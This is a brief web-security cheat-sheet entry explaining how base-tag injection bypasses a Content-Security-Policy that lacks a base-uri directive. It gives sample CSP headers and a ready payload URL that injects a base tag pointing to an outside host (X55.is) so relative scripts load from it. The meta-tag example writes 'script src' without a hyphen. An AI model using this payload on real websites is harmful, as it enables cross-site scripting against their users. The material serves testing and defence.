<!-- TODO:  -->
A dangling markup injection can be performed if the `base-uri` directive is absent in the defined CSP. Attackers can abuse the base tag to contain an XSS by making the page load a script from a server they control, if the script has a relative path (i.e `/js/app.js`). An HTTPS URL should be used if the vulnerable page is loaded over HTTPS.

In order for this to work, the CSP tag or header must contain the following:
```html
<meta http-equiv="Content-Security-Policy" content="script src 'nonce-abcd1234'">
```
```http
HTTP/1.1 200 OK
...
Content-Security-Policy: script-src 'nonce-abcd1234';
```

An attacker can be used the following payload `<Base Href=//X55.is>` as follows:
```txt
http://target-website.com/?name=guest<Base%20Href=//X55.is>
```